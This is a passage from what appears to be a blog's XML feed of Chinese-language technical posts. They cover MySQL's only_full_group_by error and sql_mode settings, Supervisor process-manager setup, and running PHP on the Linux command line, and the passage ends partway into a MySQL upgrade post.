rel="noopener">世界时钟地图</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql only_full_group_by 异常记录</title>
      <link href="/mysql-only-full-group-by-exception-record/"/>
      <url>/mysql-only-full-group-by-exception-record/</url>
      
        <content type="html"><![CDATA[<p>最近很频繁的遇到一个Mysql 异常，错误信息如下：</p><blockquote><p>Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column ‘cis.q1.query_date’ which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by</p></blockquote><p>通过错误信息可以看到，是因为 <code>sql_mode</code> 引起的。</p><p>查看Mysql 当前所使用的 <code>sql_mode</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select @@sql_mode</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">|       @@sql_mode        |</span><br><span class="line">+-------------------------+</span><br><span class="line">|   ONLY_FULL_GROUP_BY    |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><h2 id="sql-mode-配置解析"><a href="#sql-mode-配置解析" class="headerlink" title="sql_mode 配置解析"></a>sql_mode 配置解析</h2><h3 id="ONLY-FULL-GROUP-BY"><a href="#ONLY-FULL-GROUP-BY" class="headerlink" title="ONLY_FULL_GROUP_BY"></a>ONLY_FULL_GROUP_BY</h3><p>对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中。简而言之，就是SELECT后面接的列必须被GROUP BY后面接的列所包含。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❎</span><br><span class="line">select a,b from table group by a,b,c; </span><br><span class="line"></span><br><span class="line">✅</span><br><span class="line">select a,b,c from table group by a,b;</span><br></pre></td></tr></table></figure><p>这个配置会使得GROUP BY语句环境变得十分狭窄，所以一般都不加这个配置</p><h3 id="NO-AUTO-VALUE-ON-ZERO"><a href="#NO-AUTO-VALUE-ON-ZERO" class="headerlink" title="NO_AUTO_VALUE_ON_ZERO"></a>NO_AUTO_VALUE_ON_ZERO</h3><p>该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。（不信的可以试试，默认的sql_mode你在自增主键列设置为0，该字段会自动变为最新的自增值，效果和null一样），如果用户希望插入的值为0（不改变），该列又是自增长的，那么这个选项就有用了。</p><h3 id="STRICT-TRANS-TABLES"><a href="#STRICT-TRANS-TABLES" class="headerlink" title="STRICT_TRANS_TABLES"></a>STRICT_TRANS_TABLES</h3><p>在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制。（InnoDB默认事务表，MyISAM默认非事务表；MySQL事务表支持将批处理当做一个完整的任务统一提交或回滚，即对包含在事务中的多条语句要么全执行，要么全部不执行。非事务表则不支持此种操作，批处理中的语句如果遇到错误，在错误前的语句执行成功，之后的则不执行；MySQL事务表有表锁与行锁非事务表则只有表锁）</p><h3 id="NO-ZERO-IN-DATE"><a href="#NO-ZERO-IN-DATE" class="headerlink" title="NO_ZERO_IN_DATE"></a>NO_ZERO_IN_DATE</h3><p>在严格模式下，不允许日期和月份为零</p><h3 id="NO-ZERO-DATE"><a href="#NO-ZERO-DATE" class="headerlink" title="NO_ZERO_DATE"></a>NO_ZERO_DATE</h3><p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。</p><h3 id="ERROR-FOR-DIVISION-BY-ZERO"><a href="#ERROR-FOR-DIVISION-BY-ZERO" class="headerlink" title="ERROR_FOR_DIVISION_BY_ZERO"></a>ERROR_FOR_DIVISION_BY_ZERO</h3><p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如 果未给出该模式，那么数据被零除时MySQL返回NULL</p><h3 id="NO-AUTO-CREATE-USER"><a href="#NO-AUTO-CREATE-USER" class="headerlink" title="NO_AUTO_CREATE_USER"></a>NO_AUTO_CREATE_USER</h3><p>禁止GRANT创建密码为空的用户</p><h3 id="NO-ENGINE-SUBSTITUTION"><a href="#NO-ENGINE-SUBSTITUTION" class="headerlink" title="NO_ENGINE_SUBSTITUTION"></a>NO_ENGINE_SUBSTITUTION</h3><p>如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</p><h3 id="PIPES-AS-CONCAT"><a href="#PIPES-AS-CONCAT" class="headerlink" title="PIPES_AS_CONCAT"></a>PIPES_AS_CONCAT</h3><p>将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p><h3 id="ANSI-QUOTES"><a href="#ANSI-QUOTES" class="headerlink" title="ANSI_QUOTES"></a>ANSI_QUOTES</h3><p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>有三种方式可以解决该问题。</p><h3 id="关闭-ONLY-FULL-GROUP-BY"><a href="#关闭-ONLY-FULL-GROUP-BY" class="headerlink" title="关闭 ONLY_FULL_GROUP_BY"></a>关闭 ONLY_FULL_GROUP_BY</h3><p>关闭 Mysql 的 ONLY_FULL_GROUP_BY 模式 又有两种方式。</p><p>方式一：通过以下命令关闭：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET SESSION sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY,',''));</span><br></pre></td></tr></table></figure><p>方式二：编辑<code>my.cnf</code>配置文件，可以通过以下命令查看配置文件所在目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql --help | grep cnf</span><br><span class="line">                      order of preference, my.cnf, $MYSQL_TCP_PORT,</span><br><span class="line">/etc/my.cnf /etc/mysql/my.cnf /usr/local/etc/my.cnf ~/.my.cnf</span><br></pre></td></tr></table></figure><p>将 <code>ONLY_FULL_GROUP_BY</code> 关键字去掉：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">sql_mode = ""</span><br></pre></td></tr></table></figure><p>然后重启Mysql 服务即可。</p><h3 id="ANY-VALUE"><a href="#ANY-VALUE" class="headerlink" title="ANY_VALUE"></a>ANY_VALUE</h3><p>如果你不想更新配置文件，Mysql 还提供一种临时的解决方案——<a href="https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html#function_any-value" target="_blank" rel="noopener">ANY_VALUE()</a>。</p><p>使用 <code>ANY_VALUE()</code> 包裹的值不会被检查，跳过该错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">✅</span><br><span class="line">select ANY_VALUE(a), ANY_VALUE(b), ANY_VALUE(c)</span><br><span class="line">from table </span><br><span class="line">group by a,b;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/Abysscarry/article/details/79468411" target="_blank" rel="noopener">记一次Group by 查询时的ONLY_FULL_GROUP_BY错误以及后续</a></li><li><a href="https://www.cnblogs.com/Wayou/p/mysql_group_by_issue.html" target="_blank" rel="noopener">MySQL GROUP BY 的问题</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Supervisor 快速上手</title>
      <link href="/supervisor-quick-start/"/>
      <url>/supervisor-quick-start/</url>
      
        <content type="html"><![CDATA[<p><a href="http://supervisord.org/" target="_blank" rel="noopener">supervisord</a> 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具，</p><p><code>Supervisor</code> 只适用于类Unix 系统，不适用于Window。</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>因为<code>Supervisor</code> 是用 <code>Python</code> 所写的，所以可以直接使用<code>pip</code> 安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install supervisor</span><br></pre></td></tr></table></figure><p>Ubuntu：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install supervisor</span><br></pre></td></tr></table></figure><p>Mac：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install supervisor</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><code>Supervisor</code>运行时会启动一个进程——<code>supervisord</code> 。</p><ul><li><code>supervisord</code>：它负责启动所管理的进程，并将所管理的进程作为自己的子进程来启动，而且可以在所管理的进程出现崩溃时自动重启。</li><li><code>supervisorctl</code>：是命令行管理工具，可以用来执行 stop、start、restart 等命令，来对这些子进程进行管理。</li></ul><p>查看默认配置项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo_supervisord_conf</span><br></pre></td></tr></table></figure><p>将默认配置项重定向至配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf</span><br></pre></td></tr></table></figure><p>然后可以看到 <code>/etc/</code> 配置文件下出现了以下文件，其中<code>/etc/supervisor</code> 是我们需要的配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F;etc&#x2F; -name supervisor</span><br><span class="line">&#x2F;etc&#x2F;default&#x2F;supervisor</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;supervisor</span><br><span class="line">&#x2F;etc&#x2F;supervisor</span><br></pre></td></tr></table></figure><p><code>/etc/supervisord.conf</code> 核心配置文件，参考以下部分配置，<code>;</code> 表示注释。</p><p>因为<code>Supervisor</code>默认配置会把socket文件和pid守护进程生成在/tmp/目录下，/tmp/目录是缓存目录，所以我们需要手动换成<code>/var/run</code>目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">;file&#x3D;&#x2F;tmp&#x2F;supervisor.sock   ; UNIX socket 文件，supervisorctl 会使用</span><br><span class="line">file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock   ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">;chmod&#x3D;0700                 ; socket 文件的 mode，默认是 0700</span><br><span class="line">;chown&#x3D;nobody:nogroup       ; socket 文件的 owner，格式： uid:gid</span><br><span class="line"></span><br><span class="line">;[inet_http_server]         ; HTTP 服务器，提供 web 管理界面</span><br><span class="line">;port&#x3D;127.0.0.1:9001        ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性</span><br><span class="line">;username&#x3D;user              ; 登录管理后台的用户名</span><br><span class="line">;password&#x3D;123               ; 登录管理后台的密码</span><br><span class="line"></span><br><span class="line">[supervisord]</span><br><span class="line">;logfile&#x3D;&#x2F;tmp&#x2F;supervisord.log ; 日志文件，默认是 $CWD&#x2F;supervisord.log</span><br><span class="line">logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; 修改为 &#x2F;var&#x2F;log 目录，避免被系统删除</span><br><span class="line">logfile_maxbytes&#x3D;50MB        ; 日志文件大小，超出会 rotate，默认 50MB</span><br><span class="line">logfile_backups&#x3D;10           ; 日志文件保留备份数量默认 10</span><br><span class="line">loglevel&#x3D;info                ; 日志级别，默认 info，其它: debug,warn,trace</span><br><span class="line">;pidfile&#x3D;&#x2F;tmp&#x2F;supervisord.pid ; pid 文件</span><br><span class="line">pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">nodaemon&#x3D;false               ; 是否在前台启动，默认是 false，即以 daemon 的方式启动</span><br><span class="line">minfds&#x3D;1024                  ; 可以打开的文件描述符的最小值，默认 1024</span><br><span class="line">minprocs&#x3D;200                 ; 可以打开的进程数的最小值，默认 200</span><br><span class="line"></span><br><span class="line">; the below section must remain in the config file for RPC</span><br><span class="line">; (supervisorctl&#x2F;web interface) to work, additional interfaces may be</span><br><span class="line">; added by defining them in separate rpcinterface: sections</span><br><span class="line">[rpcinterface:supervisor]</span><br><span class="line">supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface</span><br><span class="line"></span><br><span class="line">[supervisorctl]</span><br><span class="line">;serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致</span><br><span class="line">serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">;serverurl&#x3D;http:&#x2F;&#x2F;127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord</span><br><span class="line"></span><br><span class="line">; 包含其他的配置文件</span><br><span class="line">[include]</span><br><span class="line">files &#x3D; relative&#x2F;directory&#x2F;*.ini    ; 可以是 *.conf 或 *.ini</span><br></pre></td></tr></table></figure><p><code>/etc/supervisor/conf.d</code> 则是用来配置管理进程的配置文件，所有需要被<code>supervisor</code> 管理的进程都需要在这里先配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[program:demo]</span><br><span class="line">command&#x3D;php demo.php  &#x2F;&#x2F; 需要执行队列的名称</span><br><span class="line">directory&#x3D; &#x2F;var&#x2F;www  &#x2F;&#x2F; 命令执行的目录或者说执行 command 之前，先切换到工作目录 可以理解为在执行命令前会切换到这个目录 </span><br><span class="line">process_name&#x3D;%(process_num)02d &#x2F;&#x2F; 默认为 %(program_name)s，即 [program:x] 中的 x这个是进程名，如果下面的numprocs参数为1的话，就不用管这个参数了，它默认值%(program_name)s也就是上面的那个program冒号后面的</span><br><span class="line"></span><br><span class="line">numprocs&#x3D;1          &#x2F;&#x2F; 进程数量当不为1时的时候，就是进程池的概念，注意process_name的设置</span><br><span class="line">autostart&#x3D;true    &#x2F;&#x2F; 是否自动启动</span><br><span class="line">autorestart&#x3D;true      &#x2F;&#x2F; 程序意外退出是否自动重启</span><br><span class="line">startsecs&#x3D;1       &#x2F;&#x2F; 自动重启间隔 </span><br><span class="line">startretries&#x3D;20   &#x2F;&#x2F; 当进程启动失败后，最大尝试启动的次数。。当超过3次后，supervisor将把此进程的状态置为FAIL 默认值为3</span><br><span class="line">redirect_stderr&#x3D;true  &#x2F;&#x2F; 如果为true，则stderr的日志会被写入stdout日志文件中  理解为重定向输出的日志</span><br><span class="line">user&#x3D;root   &#x2F;&#x2F; 这个参数可以设置一个非root用户，当我们以root用户启动supervisord之后。我这里面设置的这个用户，也可以对supervisord进行管理 </span><br><span class="line">stopsignal&#x3D;INT</span><br><span class="line">stderr_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.err.log   &#x2F;&#x2F; 子进程的stdout的日志路径 输出日志文件</span><br><span class="line">stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.out.log   &#x2F;&#x2F; 错误日志文件 当redirect_stderr&#x3D;true。这个就不用</span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ supervisord -c &#x2F;etc&#x2F;supervisord.conf</span><br></pre></td></tr></table></figure><h3 id="常用命令整理"><a href="#常用命令整理" class="headerlink" title="常用命令整理"></a>常用命令整理</h3><p>停止进程，program_name 为 [program:x] 里的 x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop program_name</span><br></pre></td></tr></table></figure><p>启动进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl start program_name</span><br></pre></td></tr></table></figure><p>重启进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl restart program_name</span><br></pre></td></tr></table></figure><p>结束所有属于名为 groupworker 这个分组的进程 (start，restart 同理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop groupworker:</span><br></pre></td></tr></table></figure><p>结束 groupworker:name1 这个进程 (start，restart 同理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop groupworker:name1</span><br></pre></td></tr></table></figure><p>停止全部进程，注：start、restart、stop 都不会载入最新的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop all</span><br></pre></td></tr></table></figure><p>载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl reload</span><br></pre></td></tr></table></figure><p>根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl update</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="unlinking-stale-socket-var-run-supervisor-sock"><a href="#unlinking-stale-socket-var-run-supervisor-sock" class="headerlink" title="unlinking stale socket /var/run/supervisor.sock"></a>unlinking stale socket /var/run/supervisor.sock</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name supervisor.sock</span><br><span class="line">&#x2F;run&#x2F;supervisor.sock</span><br><span class="line"></span><br><span class="line">$ unlink &#x2F;run&#x2F;supervisor.sock</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://m.aluaa.com/articles/2019/01/02/1546398594207.html" target="_blank" rel="noopener">“unix:///tmp/supervisor.sock no such file” 错误处理</a></li><li><a href="https://segmentfault.com/a/1190000015768529" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015768529</a></li><li><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="noopener">使用 supervisor 管理进程</a></li><li><a href="https://www.cnblogs.com/restran/p/4854623.html" target="_blank" rel="noopener">Python 进程管理工具 Supervisor 使用教程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Tutorial </category>
          
          <category> 进程管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> PHP </tag>
            
            <tag> 进程管理 </tag>
            
            <tag> Supervisor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 Linux 命令行中执行和使用 PHP 代码</title>
      <link href="/execute-and-use-php-code-on-the-linux-command-line/"/>
      <url>/execute-and-use-php-code-on-the-linux-command-line/</url>
      
        <content type="html"><![CDATA[<p>众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。</p><a id="more"></a><p>所以与其他脚本语言一样，可以直接在终端中不需要网页浏览器来运行PHP 代码。</p><h2 id="获取安装信息"><a href="#获取安装信息" class="headerlink" title="获取安装信息"></a>获取安装信息</h2><p>在安装完PHP 以及Nginx 之后，接下来我们通常需要做的是，在<code>/usr/local/var/www</code> (Mac 上的Nginx 工作目录)上创建一个内容为<code>&lt;?php phpinfo(); ?&gt;</code>，名为index.php的文件来测试PHP 是否安装正确。</p><p>执行以下命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php</span><br></pre></td></tr></table></figure><p>然后，使用浏览器访问<code>http://127.0.0.1/index.php</code>，不出意外可以看到：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200930151004.png" alt=""></p><blockquote><p>如何在终端中直接查看该信息？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># php -f &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php | less</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200930151053.png" alt=""></p><p>如果你觉得上面这种方式太麻烦了，那么还有一种更简便的方式可以达到同样的效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># php -r &#39;php phpinfo();&#39; | less</span><br></pre></td></tr></table></figure><h3 id="交互模式"><a href="#交互模式" class="headerlink" title="交互模式"></a>交互模式</h3><p>有时候我们会遇到这样一种情况，想测试一小段代码，看看其运行结果，但是又不想重新创建一个文件，太麻烦了。</p><p>如果这个时候有一个地方可以直接运行这段代码且输出结果，那该多好啊。</p><p>PHP 为我们提供了两种交互模式，前者是自动的，后者是手动的。</p><ol><li>Interactive shell</li><li>Interactive mode enabled</li></ol><p>两种模式都是使用 <code>php -a</code> 命令进入。</p><h4 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h4><p>使用这个交互式shell，你可以直接在命令行窗口里输入PHP并直接获得输出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt;echo &quot;Hello PHP&quot;;</span><br><span class="line">Hello PHP</span><br><span class="line">php &gt; echo 10+90;</span><br><span class="line">100</span><br></pre></td></tr></table></figure><p>回车即可查看输出内容。</p><h4 id="Interactive-mode-enabled"><a href="#Interactive-mode-enabled" class="headerlink" title="Interactive mode enabled"></a>Interactive mode enabled</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt;echo &quot;Hello PHP&quot;;</span><br></pre></td></tr></table></figure><p>如果出现的是这个模式，说明你的PHP并不支持交互式shell，</p><p>不过不用担心，这个模式同样也可以执行PHP 代码，只是代码的执行方式有些区别。</p><p>输入了所有PHP代码后，输入<code>Ctrl-Z</code>（windows里），或输入<code>Ctrl-D</code>（linux里），你输入的所有代码将会一次执行完成并输出结果。</p><p>输入<code>exit</code>或者<code>⌃ + c</code> 退出交互模式。</p><h3 id="PHP-脚本"><a href="#PHP-脚本" class="headerlink" title="PHP 脚本"></a>PHP 脚本</h3><p>在终端中可以把PHP 脚本作为Shell 脚本来运行。</p><p>首先你需要创建一个PHP 脚本文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo -e &#39;#!&#x2F;usr&#x2F;bin&#x2F;php\n&lt;?php phpinfo();?&gt;&#39; &gt; phpscript.php</span><br></pre></td></tr></table></figure><p><code>-e</code> 表示激活转义字符。</p><p>注意，这个脚本文件中的第一行<code>#!/usr/bin/php</code>，就像是Shell 脚本中的<code>#!/bin/bash</code>。目的是告诉Linux 命令行使用PHP 解析器来解析该文件。</p><p>运行该脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># chmod +x phpscript.php  &#x2F;&#x2F; 使脚本具有执行权限</span><br><span class="line"># .&#x2F;phpscript.php   &#x2F;&#x2F;执行脚本</span><br></pre></td></tr></table></figure><h3 id="PHP-服务"><a href="#PHP-服务" class="headerlink" title="PHP 服务"></a>PHP 服务</h3><p>PHP 有内置一个WebServer，可以很方便快速的搭建一个PHP 服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php -t &#x2F;project to path -S localhost:port</span><br></pre></td></tr></table></figure><p>然后通过浏览器访问<code>localhost:port</code> 就可以了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><code>php -a</code>：进入交互模式</li><li><code>php -f</code>：解析和执行文件</li><li><code>php -h</code>：获取帮助</li><li><code>php -i</code>：查看PHP 信息和配置</li><li><code>php -m</code>：显示已经安装的模块</li><li><code>php -r</code>：运行PHP代码不使用脚本标签’<?..?>‘</li><li><code>php -v</code>：查看PHP 版本</li><li><code>php -ini</code>：查看加载配置文件（php.ini、conf.d）</li><li><code>php -i | grep configure</code>：查看静态编译模块</li><li><code>php --ri swoole</code>：查看指定模块的配置</li><li><code>locate php.ini</code>：查询本地配置文件</li><li><code>time php script.php</code>：查看程序的执行时间</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linux.cn/article-5906-1.html" target="_blank" rel="noopener">在 Linux 命令行中执行和使用 PHP 代码</a></li><li><a href="https://www.tecmint.com/execute-php-codes-functions-in-linux-commandline/" target="_blank" rel="noopener">12 个 Linux 终端中有用的 PHP 命令行用法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何解决“ORDER BY子句不在SELECT列表中”的问题</title>
      <link href="/list-causes-mysql-5-7-with-select-distinct-and-order-by/"/>
      <url>/list-causes-mysql-5-7-with-select-distinct-and-order-by/</url>
      
        <content type="html"><![CDATA[<p>记录一个最近遇到的Mysql 问题。</p><a id="more"></a><blockquote><p>问题描述：<br>在本地项目中，部分SQL 语句执行起来，总是会报一个错。<br>而同样的SQL，在线上的服务器中执行起来没有任何问题。</p></blockquote><p>错误提示内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;foodorder.orderlist.cname&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by QMYSQL: Unable to execute query</span><br></pre></td></tr></table></figure><p>我的第一反应就是检查Mysql 的版本，很巧的是本地Mysql<br>的版本确实比服务器的版本低一些。很快我就想到一定是版本存在差异性，导致语法不兼容。</p><h2 id="升级Mysql"><a href="#升级Mysql" class="headerlink" title="升级Mysql"></a>升级Mysql</h2><p>既然是版本不一的问题，那就升级本地的Mysql 好了。</p><p>因为我的Mysql 是之前通过Homebrew 安装的，所以如需要升级，根本不用我自己手动去寻找安装包，直接通过Homebrew 的Upgrade 命令自动升级就好了。</p><p>起初我还担心自动升级会不会把我的Mysql 的版本更新的<code>5.7</code>以上，后来证明是我想多了。</p><p>不过在正式更新之前需要做好以下几件事情：</p><ul><li>对数据库做好必要的备份</li><li>停止本地Mysql 